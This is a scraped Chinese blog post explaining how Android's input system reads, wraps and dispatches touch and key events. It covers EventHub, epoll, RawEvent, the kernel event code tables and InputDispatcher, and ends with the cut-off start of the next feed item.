            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4088439235949739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    煤球王子
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:36:45.000Z" title="Tue Dec 09 2025 02:36:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">输入事件的来源</h2>
<p>数据的源头，来自硬件(如:点击屏幕)event事件输入，内核进行处理</p>
<p>当用户进行触摸、按键等操作时，硬件会产生相应的事件，这些事件经过内核的输入子系统处理后，会被传递给 Android 系统的 Input 系统。然后再由 Input 系统将事件分发给对应的应用程序处理。在这个过程中，会涉及到事件的传递、分发、处理等多个环节，任何一个环节有问题，都会引入bug或性能问题。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9160d5b72b83428ba39f7b9c072395ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852605&amp;x-signature=ZM4CLD%2F25nLxgoh9pjSFKul8PlE%3D" alt="image.png" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d467fa7a4534e34a101ae6c16b5dd91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852605&amp;x-signature=KRU481jb6u%2Bm2zIa2dESz%2FAm2Jo%3D" alt="inputevent事件产生.png" loading="lazy"/></p>
<h2 data-id="heading-1">输入事件的处理</h2>
<p>Android系统获取和分发输入事件的过程涉及到多个组件和层次，如下图所示：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/647fae196673471991e2a88fac929711~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852605&amp;x-signature=EnnmCa7oTa4toqSpYquisNV9q1U%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>
<p><strong><code>输入设备</code></strong>：是指能够产生输入事件的硬件设备，如触摸屏、键盘、鼠标等。每个输入设备都有一个唯一的ID和名称，以及一组属性和功能。</p>
</li>
<li>
<p><strong><code>EventHub</code></strong> ：是位于Native层的一个组件，它负责打开和关闭输入设备，并从Linux内核读取原始的event数据，并将其封装成<code>RawEvent</code>结构体。</p>
</li>
<li>
<p><strong><code>InputReader</code></strong>：是位于Native层的一个组件，它负责接收EventHub传递过来的<code>RawEvent</code>，并对其进行解析和转换，生成 <code>NotifyMotionArgs</code> 对象，并将其发送给InputDispatcher。</p>
</li>
<li>
<p><strong><code>InputDispatcher</code></strong>：是位于Native层的一个组件，它负责接收InputReader传递过来的<code>NotifyMotionArgs</code>，并对其进行筛选和分发，根据不同的策略将其发送给不同的Window或应用程序。</p>
</li>
<li>
<p><strong><code>InputManagerService</code></strong>：是位于Java层的一个服务，它负责管理InputDispatcher，并提供一些接口供其他组件调用，如注册或注销监听器、设置或获取过滤器等。</p>
</li>
<li>
<p><strong><code>WindowManagerService</code></strong> ：是位于Java层的一个服务，它负责管理Window和视图层次，并与InputDispatcher进行交互，提供一些回调方法供InputDispatcher调用，如拦截或分发输入事件等。</p>
</li>
<li>
<p><strong><code>ViewRootImpl</code></strong>：是位于Java层的一个类，它负责连接Window和View，并从InputDispatcher接收输入事件，并将其传递给View。</p>
</li>
<li>
<p><strong><code>View</code></strong>：是位于Java层的一个类，它是所有视图的基类，它负责处理或消费输入事件，并根据需要进行响应或反馈。</p>
</li>
</ul>
<h3 data-id="heading-2">1.获取</h3>
<h4 data-id="heading-3">1.1 EventHub 使用<code>epoll</code>监听 fd 事件</h4>
<p><strong><code>epoll</code></strong> 是 Linux 内核的一种 I/O 事件通知机制，用于高效地处理大量文件描述符的 I/O 事件。它是 select/poll 的增强版本，解决了它们在处理大量连接时性能下降的问题。</p>
<p><strong>主要用途：</strong></p>
<ul>
<li>高性能网络服务器（Nginx、Redis等）</li>
<li>文件描述符事件监控</li>
<li>异步 I/O 处理</li>
<li>Android 中的 Input 系统事件监听</li>
</ul>
<p><strong>核心优势：</strong></p>
<ul>
<li><strong>O(1) 时间复杂度</strong>：不管监控多少文件描述符，性能都保持稳定，在内核里维护一棵<strong>事件就绪红黑树</strong>，只返回“真正发生事件”的 fd，复杂度 O(1) 级别</li>
<li><strong>无需遍历所有fd</strong>：只返回就绪的文件描述符</li>
<li><strong>支持边缘触发(ET)和水平触发(LT)</strong> 模式</li>
</ul>
<p><strong>epoll API 列表:</strong></p>



































<table><thead><tr><th>API 函数</th><th>参数</th><th>返回值</th><th>作用</th></tr></thead><tbody><tr><td><strong>epoll_create1</strong></td><td><code>int flags</code></td><td>epoll 实例的文件描述符</td><td>创建新的 epoll 实例</td></tr><tr><td><strong>epoll_ctl</strong></td><td><code>int epfd</code>, <code>int op</code>, <code>int fd</code>, <code>struct epoll_event *event</code></td><td>0 成功，-1 失败</td><td>管理 epoll 实例中的文件描述符</td></tr><tr><td><strong>epoll_wait</strong></td><td><code>int epfd</code>, <code>struct epoll_event *events</code>, <code>int maxevents</code>, <code>int timeout</code></td><td>就绪的事件数量</td><td>等待 I/O 事件发生</td></tr><tr><td><strong>epoll_pwait</strong></td><td>同上，增加 <code>const sigset_t *sigmask</code></td><td>就绪的事件数量</td><td>带信号掩码的 epoll_wait</td></tr></tbody></table>
<pre><code class="hljs language-go" lang="go">#include &lt;sys/epoll.h&gt;
epfd：<span class="hljs-string">`epoll_create`</span> 函数返回的 epoll 实例的文件描述符;   作用:指定你要操作的是哪个 epoll 实例。
op: 需要执行的操作，用宏定义指定{EPOLL_CTL_ADD、EPOLL_CTL_MOD、EPOLL_CTL_DEL}
fd: 需要被监视/操作的目标文件描述符。
*event: 一个指向 epoll_event 结构体的指针，它告诉内核我们需要监视什么事件，以及我们希望关联的用户数据
<span class="hljs-type">int</span> epoll_ctl(<span class="hljs-type">int</span> epfd, <span class="hljs-type">int</span> op, <span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> epoll_event *event);


epfd：<span class="hljs-string">`epoll_create`</span> 函数返回的 epoll 实例的文件描述符;
*events： 一个由调用者分配内存的 epoll_event 结构体数组;  作用:当 <span class="hljs-string">`epoll_wait`</span> 返回时，内核会把所有就绪的事件和它们对应的 <span class="hljs-string">`data`</span>（即之前在 <span class="hljs-string">`epoll_ctl`</span> 中设置的 <span class="hljs-string">`data`</span>）填充到这个数组中。这是 <span class="hljs-string">`epoll`</span> 高效的关键之一，它通过一个系统调用就返回了所有就绪的事件，避免了像 <span class="hljs-string">`select`</span>/<span class="hljs-string">`poll`</span> 那样需要遍历所有文件描述符。
maxevents: <span class="hljs-string">`events`</span> 数组的容量，即一次最多可以接收多少个就绪事件
timeout: 超时时间，单位是毫秒。
  - **作用**：控制 <span class="hljs-string">`epoll_wait`</span> 的阻塞行为。
  - **可选值**：
     - <span class="hljs-number">-1</span>：无限阻塞。直到有事件发生才返回。
     -  <span class="hljs-number">0</span>：非阻塞。立即返回，即使没有任何事件就绪。用于检查状态。
     -  &gt; <span class="hljs-number">0</span>：阻塞指定毫秒数。如果在超时，时间内有事件就绪，则立即返回；否则在超时后返回。
<span class="hljs-type">int</span> epoll_wait(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event *events,  <span class="hljs-type">int</span> maxevents, <span class="hljs-type">int</span> timeout);
</code></pre>
<p><strong>epoll_ctl 操作类型：</strong></p>
<ul>
<li><code>EPOLL_CTL_ADD</code> - 添加文件描述符到监控列表</li>
<li><code>EPOLL_CTL_MOD</code> - 修改已监控的文件描述符的事件设置</li>
<li><code>EPOLL_CTL_DEL</code> - 从监控列表中移除文件描述符</li>
</ul>
<p><strong>epoll 事件类型：</strong></p>





















































































<table><thead><tr><th>事件类型</th><th>十进制值</th><th>描述</th></tr></thead><tbody><tr><td>EPOLLIN</td><td>1</td><td>文件描述符<code>可读</code>（有数据可读取、有数据到达、新连接到达等）</td></tr><tr><td>EPOLLPRI</td><td>2</td><td>紧急数据可读（带外数据）</td></tr><tr><td>EPOLLOUT</td><td>4</td><td>文件描述符<code>可写</code>（可以发送数据、发送缓冲区有空间）</td></tr><tr><td>EPOLLRDNORM</td><td>64</td><td>普通数据可读</td></tr><tr><td>EPOLLRDBAND</td><td>128</td><td>优先级带数据可读</td></tr><tr><td>EPOLLWRNORM</td><td>256</td><td>普通数据可写</td></tr><tr><td>EPOLLWRBAND</td><td>512</td><td>优先级带数据可写</td></tr><tr><td>EPOLLMSG</td><td>1024</td><td>有消息可用（很少使用）</td></tr><tr><td>EPOLLERR</td><td>8</td><td>错误条件（总是监控，无需设置）</td></tr><tr><td>EPOLLHUP</td><td>16</td><td>挂起（总是监控，无需设置）</td></tr><tr><td>EPOLLRDHUP</td><td>8192</td><td>对端关闭连接或半关闭</td></tr><tr><td>EPOLLEXCLUSIVE</td><td>268435456</td><td>独占唤醒，避免惊群效应(&gt;=3.7)</td></tr><tr><td>EPOLLWAKEUP</td><td>536870912</td><td>确保在系统挂起时<code>保持唤醒</code></td></tr><tr><td>EPOLLONESHOT</td><td>1073741824</td><td>一次性事件，触发后需重新注册、需重新 epoll_ctl</td></tr><tr><td>EPOLLET</td><td>2147483648</td><td>边缘触发（Edge Triggered），默认水平触发</td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ed81e16012c4c939a6a86f53e67decd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852605&amp;x-signature=wZa3VT455kKpfbOizEA9Mah3rsg%3D" alt="EventHub1.png" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99fe2668f5b94898908a431c55c01ef0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852605&amp;x-signature=F1ZsfiU4aa28%2BVN3VBRNlagkANI%3D" alt="EventHub2.png" loading="lazy"/></p>
<h4 data-id="heading-4">1.2 EventHub 封装event为RawEvent</h4>
<p>这个结构体是 Android 输入系统里<strong>最底层、最原始的事件单元</strong>，从内核的 <code>/dev/input/eventX</code> 节点读出来以后，EventHub 直接把它包成 <code>RawEvent</code> 交给上层（InputReader）。 它只负责“陈述事实”，不做任何解释或加工。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">/*
 * A raw event as retrieved from the EventHub.
 */</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">RawEvent</span> {
    <span class="hljs-comment">// Time when the event happened. Time when the event was read by EventHub. Only populated for input events. For other events (device added/removed/etc), this value is undefined and should not be read.</span>
    <span class="hljs-type">nsecs_t</span> when;
    <span class="hljs-type">nsecs_t</span> readTime;
    <span class="hljs-type">int32_t</span> deviceId; <span class="hljs-comment">//产生事件的“输入设备ID”</span>
    <span class="hljs-type">int32_t</span> type; <span class="hljs-comment">//事件类型</span>
    <span class="hljs-type">int32_t</span> code; <span class="hljs-comment">//事件代码</span>
    <span class="hljs-type">int32_t</span> value;<span class="hljs-comment">//事件值</span>
};
</code></pre>








































<table><thead><tr><th>字段</th><th>类型</th><th>含义</th></tr></thead><tbody><tr><td><code>when</code></td><td><code>nsecs_t</code>（纳秒）</td><td><strong>事件在硬件层面发生的时间</strong>，由内核驱动打戳，精度到纳秒。</td></tr><tr><td><code>readTime</code></td><td><code>nsecs_t</code></td><td><strong>EventHub 从 fd 读出该事件的时间</strong>，仅对<strong>输入事件</strong>有效</td></tr><tr><td><code>deviceId</code></td><td><code>int32_t</code></td><td>产生该事件的<strong>输入设备 ID</strong>，EventHub 内部编号，与 <code>/dev/input/eventX</code> 一一对应。</td></tr><tr><td><code>type</code></td><td><code>int32_t</code></td><td><strong>事件类型</strong>，对应内核的 <code>EV_*</code> 宏：<br/> <code>0</code> = <code>EV_SYN</code>（同步包）<br/> <code>1</code> = <code>EV_KEY</code>（按键/触摸按下）<br/> <code>3</code> = <code>EV_ABS</code>（绝对坐标，如触摸屏）<br/> …</td></tr><tr><td><code>code</code></td><td><code>int32_t</code></td><td><strong>事件代码</strong>，在 <code>type</code> 下的具体含义：<br/> 若 <code>type == EV_KEY</code>，<code>code == BTN_TOUCH</code> 表示触摸按下；<br/> 若 <code>type == EV_ABS</code>，<code>code == ABS_MT_POSITION_X</code> 表示 X 坐标。</td></tr><tr><td><code>value</code></td><td><code>int32_t</code></td><td><strong>事件值</strong>：<br/> 对按键：<code>1</code> 按下，<code>0</code> 松开，<code>2</code> 长按重复；<br/> 对坐标：具体的坐标/压力值；<br/> 对 <code>SYN_REPORT</code>：必须为 <code>0</code>，表示一包数据结束。</td></tr></tbody></table>
<blockquote>
<p><code>RawEvent</code> 就是内核 <code>input_event</code> 结构的“Android 复刻版”，额外加了一个 <code>readTime</code> 用于性能统计，上层代码靠RawEvent逐条还原用户的手指、按键、鼠标等原始动作。</p>
</blockquote>
<p><strong>事件类型：</strong></p>

























































































<table><thead><tr><th>宏</th><th>十进制</th><th>含义</th><th>常见用途</th></tr></thead><tbody><tr><td><code>EV_SYN</code></td><td>0</td><td><strong>同步事件</strong></td><td>打包用，标记“一组事件结束”</td></tr><tr><td><code>EV_KEY</code></td><td>1</td><td><strong>按键</strong></td><td>遥控器/键盘/按钮 <strong>按下/松开</strong></td></tr><tr><td><code>EV_REL</code></td><td>2</td><td><strong>相对位移</strong></td><td>鼠标移动、滚轮</td></tr><tr><td><code>EV_ABS</code></td><td>3</td><td><strong>绝对位移</strong></td><td>触摸屏坐标、摇杆绝对值</td></tr><tr><td><code>EV_MSC</code></td><td>4</td><td><strong>杂项</strong></td><td>扫描码、USB 用法码、低层调试数据</td></tr><tr><td><code>EV_SW</code></td><td>5</td><td><strong>开关</strong></td><td>耳机插拔、盖子开合、HDMI 切换</td></tr><tr><td><code>EV_LED</code></td><td>17</td><td><strong>LED 灯</strong></td><td>键盘大写灯、NumLock</td></tr><tr><td><code>EV_SND</code></td><td>18</td><td><strong>声音</strong></td><td>蜂鸣器、古董 PC 喇叭（几乎不用）</td></tr><tr><td><code>EV_REP</code></td><td>20</td><td><strong>自动重复</strong></td><td>键盘长按连续触发</td></tr><tr><td><code>EV_FF</code></td><td>21</td><td><strong>力反馈</strong></td><td>游戏手柄震动、方向盘力回馈</td></tr><tr><td><code>EV_PWR</code></td><td>22</td><td><strong>电源</strong></td><td>休眠/唤醒键（内核级别）</td></tr><tr><td><code>EV_FF_STATUS</code></td><td>23</td><td><strong>力反馈状态</strong></td><td>设备报告力反馈当前状态</td></tr><tr><td><code>EV_MAX</code></td><td>31</td><td><strong>边界标记</strong></td><td>数组大小用，不会真的出现</td></tr></tbody></table>
<p><strong>✅ (1). EV_SYN（type=0）同步事件—&gt;事件代码：</strong></p>






























<table><thead><tr><th>十进制 code</th><th>宏常量</th><th>作用</th></tr></thead><tbody><tr><td>0</td><td><code>SYN_REPORT</code></td><td><strong>一组事件结束</strong>，前面所有事件算一个“帧”</td></tr><tr><td>1</td><td><code>SYN_CONFIG</code></td><td>已废弃，几乎见不到</td></tr><tr><td>2</td><td><code>SYN_MT_REPORT</code></td><td>旧式多点触控，Android 已不用</td></tr><tr><td>3</td><td><code>SYN_DROPPED</code></td><td><strong>内核缓冲区溢出</strong>，告诉用户空间“我丢事件了”</td></tr></tbody></table>
<p><strong>✅ (2). EV_KEY（type=1）按键事件—&gt;事件代码：</strong></p>







































































































































<table><thead><tr><th>十进制 code</th><th>宏常量</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td><code>KEY_ESC</code></td><td>返回/ESC</td></tr><tr><td>2</td><td><code>KEY_1</code> ~ 11 <code>KEY_9</code></td><td>数字 1-9</td></tr><tr><td>10</td><td><code>KEY_0</code></td><td>数字 0</td></tr><tr><td>28</td><td><code>KEY_ENTER</code></td><td>确定/回车</td></tr><tr><td>102</td><td><code>KEY_HOME</code></td><td>Home 键</td></tr><tr><td>103</td><td><code>KEY_UP</code></td><td>上</td></tr><tr><td>105</td><td><code>KEY_LEFT</code></td><td>左</td></tr><tr><td>106</td><td><code>KEY_RIGHT</code></td><td>右</td></tr><tr><td>108</td><td><code>KEY_DOWN</code></td><td>下</td></tr><tr><td>114</td><td><code>KEY_VOLUMEDOWN</code></td><td>音量减</td></tr><tr><td>115</td><td><code>KEY_VOLUMEUP</code></td><td>音量加</td></tr><tr><td>116</td><td><code>KEY_POWER</code></td><td>电源键</td></tr><tr><td>139</td><td><code>KEY_MENU</code></td><td>菜单键</td></tr><tr><td>158</td><td><code>KEY_BACK</code></td><td>返回键（Android 最常用）</td></tr><tr><td>172</td><td><code>KEY_HOMEPAGE</code></td><td>首页（浏览器/launcher）</td></tr><tr><td>217</td><td><code>KEY_SEARCH</code></td><td>搜索键</td></tr><tr><td>304</td><td><code>BTN_SOUTH</code></td><td>游戏手柄 A</td></tr><tr><td>305</td><td><code>BTN_EAST</code></td><td>游戏手柄 B</td></tr><tr><td>306</td><td><code>BTN_C</code></td><td>游戏手柄 C</td></tr><tr><td>307</td><td><code>BTN_NORTH</code></td><td>游戏手柄 Y</td></tr><tr><td>308</td><td><code>BTN_WEST</code></td><td>游戏手柄 X</td></tr><tr><td>310</td><td><code>BTN_TL</code></td><td>左肩键 L1</td></tr><tr><td>311</td><td><code>BTN_TR</code></td><td>右肩键 R1</td></tr><tr><td>315</td><td><code>BTN_START</code></td><td>手柄 Start</td></tr><tr><td>316</td><td><code>BTN_SELECT</code></td><td>手柄 Select</td></tr></tbody></table>
<h4 data-id="heading-5">1.3各类Mapper封装为NotifyKeyArgs</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bfc70b9fe94405c9f584b9da8573db8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852605&amp;x-signature=LTmJiAjVDfTwShbp7FbPli%2B%2BqAE%3D" alt="关键类1.png" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/401522a3dcdb40c983a2f32d7691a37b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852605&amp;x-signature=0qJcq3acyARtNz4gikupPQvHQmA%3D" alt="事件的输入粗略流程.png" loading="lazy"/></p>
<h3 data-id="heading-6">2.分发</h3>
<h4 data-id="heading-7">2.1InputDispatcher接收源数据</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8c87f5de2564a3bb68d57ca22c438d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852605&amp;x-signature=Jx5wsJQdVn%2Bs31mYojyYcFSBCxo%3D" alt="InputDispatcher的数据来源.png" loading="lazy"/>
从原始数据到InputDispatcher接收数据的封装历程
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ff5f54d7c974f7a810fa8dd607f9a94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852605&amp;x-signature=%2BC1lunyhkOBMLh8zJkoV%2B%2B%2FlhQ4%3D" alt="keyevent.png" loading="lazy"/></p>
<h4 data-id="heading-8">2.2 InputDispatcher发送数据</h4>
<p>InputDispatcher 是 Android 输入系统的“中央邮局”。它把 <strong>InputReader</strong> 打包好的 <code>NotifyKeyArgs</code>、<code>NotifyMotionArgs</code> 等“裸事件”转成 <strong>EventEntry</strong> 队列，再按“<strong>窗口焦点</strong>、<strong>触摸区域</strong>、<strong>权限</strong>”三条规则投递到目标应用的主线程。核心流程可浓缩为 5 步：</p>
<ol>
<li>
<p>入队<br/>
InputReader 通过 <code>InputDispatcher::notifyKey()</code> / <code>notifyMotion()</code> 把事件推进 <strong>mInboundQueue</strong>（单向生产，无锁）。</p>
</li>
<li>
<p>找目标，在 <strong>dispatchOnceInnerLocked()</strong> 里：</p>
<ul>
<li><strong>Key 事件</strong> → 调用 <code>findFocusedWindowTargetsLocked()</code>，拿到当前“<strong>输入法窗口</strong>”或“<strong>前台焦点窗口</strong>”。</li>
<li><strong>Motion 事件</strong> → 调用 <code>findTouchedWindowTargetsLocked()</code>，按 <strong>x,y</strong> 遍历 <code>InputWindowHandle</code> 列表，<strong>最上层、可见、可触摸、无遮罩</strong>的窗口胜出；同时把 <strong>PointerCapture</strong>、<strong>监视通道</strong>（monitor）也加进来。</li>
</ul>
</li>
<li>
<p>权限检查，对 <strong>Key</strong> 还要过 <strong>policy</strong>（PhoneWindowManager）拦截：</p>
<ul>
<li>HOME/BACK/POWER 等系统键会被 policy 提前消费，不会继续发给应用。</li>
<li>如果目标窗口没有 <code>INJECT_EVENTS</code> 权限，则丢弃。</li>
</ul>
</li>
<li>
<p>连接投递<br/>
每个窗口在注册时都会新建 <strong>InputChannel</strong>（一对 socket）。<br/>
把事件序列化成 <code>InputMessage</code>，通过 <strong>InputPublisher::publishKeyEvent() / publishMotionEvent()</strong> 写进 socket；<br/>
应用主线程的 <strong>InputConsumer</strong> 在下次 <code>nativePollOnce()</code> 时收到消息，直接组装成 Java 层的 <code>KeyEvent</code> / <code>MotionEvent</code> 回调。</p>
</li>
<li>
<p>等待与重试<br/>
如果目标窗口 5 秒内不消费（不 finish），触发 <strong>ANR</strong>；<br/>
如果窗口失去焦点或区域变化，调用 <code>cancelEventsForAnrLocked()</code> 把后续事件取消或重新分发给新窗口。</p>
</li>
</ol>
<p>一句话：<br/>
<strong>InputDispatcher = 队列 + 焦点查找 + 权限过滤 + socket 直投 + ANR  watchdog</strong>。所有事件必须经过它“盖章”才能变成应用收到的 <code>onKeyDown()</code> / <code>onTouchEvent()</code>。</p>
<p>学习参考：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.aliyun.com%2Farticle%2F1489580" target="_blank" title="https://developer.aliyun.com/article/1489580" ref="nofollow noopener noreferrer">developer.aliyun.com/article/148…</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fkernel.meizu.com%2F2023%2F10%2F27%2FAndroid-inputTuning-and-Optimizing%2F" target="_blank" title="https://kernel.meizu.com/2023/10/27/Android-inputTuning-and-Optimizing/" ref="nofollow noopener noreferrer">kernel.meizu.com/2023/10/27/…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[性能飞跃！这几个现代浏览器API让页面加载速度提升至90+]]></title>    <link>https://juejin.cn/post/7581385235965444130</link>    <guid>https://juejin.cn/post/7581385235965444130</guid>    <pubDate>2025-12-09T02:55:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581385235965444130" data-draft-id="7581437632853819432" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="性能飞跃！这几个现代浏览器API让页面加载速度提升至90+"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2025-12-09T02:55:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大知闲闲i"/> <meta itemprop="url" content="https://juejin.cn/user/3799545205237111"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" 